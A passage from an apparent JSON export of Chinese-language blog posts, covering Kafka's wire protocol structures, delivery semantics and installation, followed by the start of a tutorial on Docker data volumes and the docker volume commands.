style=\"color:#4f4f4f;\">服务器端先读出一个int32的整数从而获取这次Request的大小</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">然后读取对应字节数的数据从而得到Request的具体内容</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">服务器端处理了请求后，也用同样的方式来发送响应。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">6、RequestMessage结构：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">RequestMessage =&gt; ApiKey ApiVersionCorrelationId ClientId Request</span></p>\n\n<table border=\"1\" cellspacing=\"0\"><tbody><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">名称</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">类型</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">描术</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">ApiKey</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int16</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这次请求的API编号</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">ApiVersion</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int16</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示请求的API的版本，有了版本后就可以做到后向兼容</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">CorrelationId</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int32</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">由客户端指定的一个数字唯一标示这次请求的id，服务器端在处理完请求后也会把同样的CorrelationId写到Response中，这样客户端就能把某个请求和响应对应起来了。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">ClientId</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">string</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">客户端指定的用来描述客户端的字符串，会被用来记录日志和监控，它唯一标示一个客户端。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Request</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">—</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Request的具体内容。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">7、ResponseMessage结构：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">ResponseMessage =&gt; CorrelationId Response</span></p>\n\n<table border=\"1\" cellspacing=\"0\"><tbody><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">名称</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">类型</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">描术</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">CorrelationId</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int32</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">对应Request的CorrelationId。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Response</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">—</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">对应Request的Response，不同的Request的Response的字段是不一样的。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">      </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Kafka采用是经典的Reactor(同步IO)模式，也就是1个Acceptor响应客户端的连接请求，N个Processor来读取数据，这种模式可以构建出高性能的服务器。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">8、Message结构：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Message:Producer生产的消息,键-值对</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Message =&gt; Crc MagicByte Attributes KeyValue</span></p>\n\n<table border=\"1\" cellspacing=\"0\"><tbody><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">名称</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">类型</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">描术</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">CRC</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int32</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条消息(不包括CRC字段本身)的校验码。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">MagicByte</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int8</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示消息格式的版本，用来做后向兼容，目前值为0。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Attributes</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int8</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条消息的元数据，目前最低两位用来表示压缩格式。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Key</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">bytes</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条消息的Key，可以为null。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Value</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">bytes</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条消息的Value。Kafka支持消息嵌套，也就是把一条消息作为Value放到另外一条消息里面。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">9、MessageSet结构：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">MessageSet:用来组合多条Message，它在每条Message的基础上加上了Offset和MessageSize</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">MessageSet =&gt; [Offset MessageSize Message]</span></p>\n\n<table border=\"1\" cellspacing=\"0\"><tbody><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">名称</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">类型</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">描术</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Offset</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int64</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">它用来作为log中的序列号，Producer在生产消息的时候还不知道具体的值是什么，可以随便填个数字进去。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">MessageSize</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">int32</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条Message的大小。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr><tr><td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">Message</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">-</span></span></span></p>\n\t\t\t</td>\n\t\t\t<td style=\"border-color:#dddddd;vertical-align:top;\">\n\t\t\t<p style=\"margin-left:0px;\"><span style=\"color:rgba(0,0,0,.75);\"><span style=\"color:#4f4f4f;\"><span style=\"color:#4f4f4f;\">表示这条Message的具体内容，其格式见上一小节。</span></span></span></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">10、     Request/Respone和Message/MessageSet的关系：</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Request/Response是通讯层的结构，和网络的7层模型对比的话，它类似于TCP层。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">Message/MessageSet定义的是业务层的结构，类似于网络7层模型中的HTTP层。Message/MessageSet只是Request/Response的payload中的一种数据结构。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">备注：Kafka的通讯协议中不含Schema，格式也比较简单，这样设计的好处是协议自身的Overhead小，再加上把多条Message放在一起做压缩，提高压缩比率，从而在网络上传输的数据量会少一些。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<h2 id=\"114-数据传输的事务定义\" style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"><strong><a name=\"t14\"></a>1.14 数据传输的事务定义：</strong></span></h2>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">1、<strong>at most once</strong>:最多一次,这个和JMS中”非持久化”消息类似.发送一次，无论成败，将不会重发。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">at most once:消费者fetch消息,然后保存offset，然后处理消息;当client保存offset之后，但是在消息处理过程中出现了异常，导致部分消息未能继续处理.那么此后”未处理”的消息将不能被fetch到，这就是“atmost once”。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">2、<strong>at least once</strong>:消息至少发送一次，如果消息未能接受成功，可能会重发，直到接收成功。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">at least once:消费者fetch消息，然后处理消息，然后保存offset.如果消息处理成功之后，但是在保存offset阶段zookeeper异常导致保存操作未能执行成功，这就导致接下来再次fetch时可能获得上次已经处理过的消息，这就是“atleast once”，原因offset没有及时的提交给zookeeper，zookeeper恢复正常还是之前offset状态。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">3、<strong>exactly once</strong>:消息只会发送一次。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">exactly once: kafka中并没有严格的去实现(基于2阶段提交，事务)，我们认为这种策略在kafka中是没有必要的。</span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">注：通常情况下“at-least-once”是我们首选。(相比at most once而言，重复接收数据总比丢失数据要好)。</span></p>\n\n<h1 style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\">二、消息队列之Kafka工作原理与安装介绍</span></h1>\n\n<h2><span style=\"color:#4f4f4f;\">2.1消息队列之Kafka工作原理 -- broker</span></h2>\n\n<p><img alt=\"\" class=\"has\" height=\"387\" src=\"https://img-blog.csdnimg.cn/20190429235345968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"670\"></p>\n\n<h2>2.2消息队列之Kafka工作原理 -- topic</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"388\" src=\"https://img-blog.csdnimg.cn/20190429235413180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"520\"></p>\n\n<h2>2.3消息队列之Kafka工作原理 – partition</h2>\n\n<p style=\"margin-left:0px;\"><img alt=\"\" class=\"has\" height=\"383\" src=\"https://img-blog.csdnimg.cn/20190429235523498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"786\"></p>\n\n<h2 style=\"margin-left:0px;\">2.4消息队列之Kafka安装介绍</h2>\n\n<p>版本</p>\n\n<p><a href=\"https://www.confluent.io/product/compare/\" rel=\"nofollow\">Apache Kafka 与 Confluent Platform </a></p>\n\n<p><a href=\"https://github.com/confluentinc/cp-docker-images\">Docker镜像 Confluent kafka 的docker镜像 </a></p>\n\n<p>客户端工具</p>\n\n<p>Apache Kafka的Python客户端：kafka-python</p>\n\n<p>Confluent kafka的Python客户端： confluent-kafka-python</p>\n\n<p><a href=\"https://github.com/confluentinc/confluent-kafka-python\">git地址</a></p>\n\n<p><a href=\"https://docs.confluent.io/current/clients/confluent-kafka-python/index.html#consumer\" rel=\"nofollow\">使用文档</a></p>\n\n<h2>2.5消息队列之Kafka使用介绍</h2>\n\n<p><strong>Kafka启动：</strong></p>\n\n<p>单节点单broker 单节点多broker</p>\n\n<p><strong>Kafka使用时的显著特征</strong></p>\n\n<p>分区之间是无序的，但分区内的消息是有序的</p>\n\n<p>对于topic的消费，消费者的数量 应 不多于 该topic分区的数量，否则多余的消费者将必定无法接收到消息</p>\n\n<p>一个消费者可同时消费多个topic</p>\n\n<p>在订阅消费时，Kafka保证每条消息在同一个Consumer Group里只会被某一个Consumer消费</p>\n\n<p> </p>\n\n<h1>总结：掌握原理 活用文档 多实践</h1>\n\n<p style=\"margin-left:0px;\"><span style=\"color:#4f4f4f;\"> </span></p>\n                                    </div>", "log_PostTime": 1584891106, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之数据管理", "log_Intro": "Docker核心技术之数据管理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>一、Docker 数据卷简介</h1>\n\n<h2>为什么用数据卷</h2>\n\n<p>宿主机无法直接访问容器中的文件</p>\n\n<p>容器中的文件没有持久化，导致容器删除后，文件数据也随之消失</p>\n\n<p>容器之间也无法直接访问互相的文件</p>\n\n<p><strong>为解决这些问题，docker加入了数据卷(volumes)机制，能很好解决上面问题，以实现： </strong></p>\n\n<p>容器与主机之间、容器与容器之间共享文件</p>\n\n<p>容器中数据的持久化</p>\n\n<p>将容器中的数据备份、迁移、恢复等</p>\n\n<h2>数据卷的特点</h2>\n\n<p>数据卷存在于宿主机的文件系统中，独立于容器，和容器的生命周期是分离的。</p>\n\n<p>数据卷可以目录也可以是文件，容器可以利用数据卷与宿主机进行数据共享，实现了容器间的数据共享和交换。</p>\n\n<p>容器启动初始化时，如果容器使用的镜像包含了数据，这些数据会拷贝到数据卷中。</p>\n\n<p>容器对数据卷的修改是实时进行的。</p>\n\n<p>数据卷的变化不会影响镜像的更新。数据卷是独立于联合文件系统，镜像是基于联合文件系统。镜像与数据卷之间不会有相互影响。</p>\n\n<h1>二、Docker 数据卷管理</h1>\n\n<h2>Docker挂载容器数据卷的三种方式</h2>\n\n<p><strong>bind mounts：</strong>将宿主机上的一个文件或目录被挂载到容器上。</p>\n\n<p><strong>volumes：</strong>由Docker创建和管理。使用docker volume命令管理</p>\n\n<p><strong>tmpfs mounts：</strong>tmpfs 是一种基于内存的临时文件系统。tmpfs mounts 数据不会存储在磁盘上。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"255\" src=\"https://img-blog.csdnimg.cn/20190430234131105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"502\"></p>\n\n<h2>bind mounts方式挂载数据卷</h2>\n\n<p>利用docker run/create的参数为容器挂载数据卷</p>\n\n<p>用法：     方式一： -v, --volume参数           </p>\n\n<p>                                -v 宿主机文件或文件夹路径:容器中的文件或者文件夹路径     </p>\n\n<p>               方式二：--mount参数            </p>\n\n<p>                              --mount type=bind, src=宿主机文件或文件夹路径, dst=容器中的文件或者文件夹路径            </p>\n\n<p>注意：src指定的文件和路径必须提前创建或存在</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"105\" src=\"https://img-blog.csdnimg.cn/20190430234319938.png\" width=\"784\"></p>\n\n<h2>volumes方式挂载数据卷</h2>\n\n<p>利用docker run/create为容器挂载数据卷</p>\n\n<p>用法：     方式一： -v, --volume参数             </p>\n\n<p>                               -v VOLUME-NAME:容器中的文件或者文件夹路径     </p>\n\n<p>                方式二：--mount 参数       </p>\n\n<p>                              --mount type=volume, src=VOLUME-NAME, dst=容器中的文件或者文件夹路径</p>\n\n<p>volume对象管理：     </p>\n\n<p>docker volume        命令管理volume数据卷对象     </p>\n\n<p>docker volume create        创建数据卷对象     </p>\n\n<p>docker volume inspect        查看数据卷详细信息     </p>\n\n<p>docker volume ls            查看已创建的数据卷对象     </p>\n\n<p>docker volume prune        删除未被使用的数据卷对象     </p>\n\n<p>docker volume rm        删除一个或多个数据卷对象</p>\n\n<h2>tmpfs mount方式挂载数据卷</h2>\n\n<p>利用docker run/create为容器挂载数据卷</p>\n\n<p>用法：     --mount type=tmpfs, dst=PATH</p>\n\n<h2>共享其他容器的数据卷-数据卷容器</h2>\n\n<p>利用docker run/create 的--volumes-from参数指定数据卷容器</p>\n\n<p>用法：     docker run/create --volumes-from CONTAINER</p>\n\n<h1>三、Docker 